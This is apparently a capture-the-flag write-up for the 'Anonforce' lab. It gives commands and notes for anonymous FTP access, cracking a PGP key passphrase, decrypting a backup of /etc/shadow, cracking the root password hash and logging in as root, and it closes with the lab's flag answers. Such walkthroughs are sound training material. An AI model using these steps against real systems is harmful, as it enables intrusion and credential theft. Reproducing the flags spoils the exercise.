# Anonforce - Easy

```shell
sudo vim /etc/hosts
#map ip to anonforce.thm

nmap -T4 -p- -A -Pn -v anonforce.thm

ftp anonforce.thm
#using anonymous mode

cd notread

ls -la
#this contains a .pgp and .asc file

mget *

cd ..

cd home

ls -la

cd melodias

ls -la
#we can get user flag

exit
#exit ftp

gpg2john private.asc > asc_hash

john --wordlist=/usr/share/wordlists/rockyou.txt asc_hash
#gives passphrase

gpg --import private.asc
#use passphrase

gpg --decrypt backup.pgp
#prints /etc/shadow

vim hash.txt

hashcat -a 0 melodias.txt /usr/share/wordlists/rockyou.txt
#does not crack

hashcat -a 0 root.txt /usr/share/wordlists/rockyou.txt
#cracks the hash

ssh root@anonforce.thm
#use password found above
#we are root
```

* Open ports & services:

  * 21 - ftp - vsftpd 3.0.3
  * 22 - ssh - OpenSSH 7.2p2 (Ubuntu)

* We can log into ```ftp``` using anonymous mode.

* Logging in, we can see that it lists the root directory; we can enumerate for clues.

* We can get user flag from 'melodias' home directory.

* From the /notread directory, we can get a .pgp file and .asc file.

* Using ```gpg2john```, we can crack the .asc file to get passphrase.

* We can use the passphrase to decrypt the .pgp file and view its contents.

* Decrypting the .pgp file outputs the contents of /etc/shadow - this includes hashes

* We can copy the hashes for 'root' and 'melodias' to a file.

* We can attempt to crack this using ```hashcat``` - the hash for 'melodias' is a md5crypt hash and the 'root' hash is a sha512crypt hash.

* We are unable to crack the hash for 'melodias' using rockyou wordlist, but we are able to crack the root hash.

* We can log into SSH using the cracked password for root, and get root flag.

```markdown
1. user.txt - 606083fd33beb1284fc51f411a706af8

2. root.txt - f706456440c7af4187810c31c6cebdce
```
